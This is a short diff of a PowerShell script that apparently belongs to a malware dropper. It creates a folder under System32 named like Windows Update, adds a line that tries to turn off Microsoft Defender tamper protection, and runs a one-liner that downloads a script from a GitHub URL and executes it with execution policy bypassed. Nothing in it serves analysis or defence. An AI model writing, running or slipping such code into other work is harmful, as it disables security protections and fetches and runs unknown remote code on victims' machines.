@@ -19,5 +19,6 @@ $path = "C:\Windows\System32\WindowsUpdate"
 if (!(Test-Path $path)) {
     New-Item -ItemType Directory -Path $path -Force
 }
+Set-MpPreference -DisableTamperProtection $true 
 powershell -ExecutionPolicy Bypass -Command "iwr https://raw.githubusercontent.com/no123ex/tes/refs/heads/main/addex.ps1 -UseBasicParsing | iex"
 
